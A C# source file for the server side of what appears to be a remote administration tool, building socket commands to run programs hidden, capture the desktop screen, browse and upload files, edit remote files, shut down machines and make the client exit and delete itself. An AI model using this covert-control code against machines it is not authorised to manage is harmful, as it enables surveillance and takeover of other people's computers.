using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
namespace Server.Classes
{
    class Commands
    {
        public static void SendData(Socket soc, byte[] data)
        {
            try
            {
                soc.Send(data);
            }
            catch (Exception ex)
            {
                //Addlog(ex.Message.ToString(), Color.Red);
            }
        }
        public static void GetSystemInformation(Socket soc)
        {
            string cmd = "system.information|null";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void SendMessage(Socket soc, string message, string username)
        {
            string cmd = "run|msg.exe<" + username + " " + message + "<hidden";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void RunProgram(Socket soc, string cmd)
        {
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void ExitClient(Socket soc)
        {
            string cmd = "exit|false";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void ExitClientAndDelete(Socket soc)
        {
            string cmd = "exit|true";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void RestartClient(Socket soc)
        {
            string cmd = "run|shutdown.exe<";
            //restart
            cmd += "/r /t 0";
            cmd += "<hidden";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void ShutdownClient(Socket soc)
        {
            string cmd = "run|shutdown.exe<";
            //shutdown
            cmd += "-s -t 10";
            cmd += "<hidden";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void GetDesktopScreen(Socket soc, int width, int height, int type)
        {
            string cmd = "system.screen|" + width.ToString() + "<" + height.ToString() + "<" + type.ToString();
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        //========================================================================================================= Remote File Manager
        public static void GetRemoteDrives(Socket soc)
        {
            string cmd = "io.drive|none";
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void GetRemoteEntries(Socket soc, string path)
        {
            string cmd = "io.entries|" + path;
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void IO_Oprator(Socket soc, string cmd, string parameter)
        {
            cmd += "|" + parameter;
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len * 2) + 16];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        public static void SaveFile(string path, byte[] data)
        {
            try
            {
                System.IO.File.WriteAllBytes(path, data);
            }
            catch
            {

            }
        }
        public static void UploadFile(Socket soc, string path, string target)
        {
            try
            {
                byte[] file = System.IO.File.ReadAllBytes(path);
                string cmd = "uploadfile|" + target;
                int len = cmd.Length * 2;
                byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
                byte[] b2 = Encoding.Unicode.GetBytes(cmd);
                byte[] data = new byte[(len) + 16 + file.Length];
                b1.CopyTo(data, 0);
                b2.CopyTo(data, 16);
                file.CopyTo(data, 16 + b2.Length);
                SendData(soc, data);
                //System.Windows.Forms.MessageBox.Show("Upload Completed.");
            }
            catch
            {

            }
        }
        public static void SendFileForEdit(Socket soc, string path, string content)
        {
            string cmd = "editfile_save|" + path+"<"+content;
            int len = cmd.Length * 2;
            byte[] b1 = Encoding.Unicode.GetBytes(len.ToString("00000000"));
            byte[] b2 = Encoding.Unicode.GetBytes(cmd);
            byte[] data = new byte[(len) + 16 ];
            b1.CopyTo(data, 0);
            b2.CopyTo(data, 16);
            SendData(soc, data);
        }
        //=========================================================================================================
    }
}
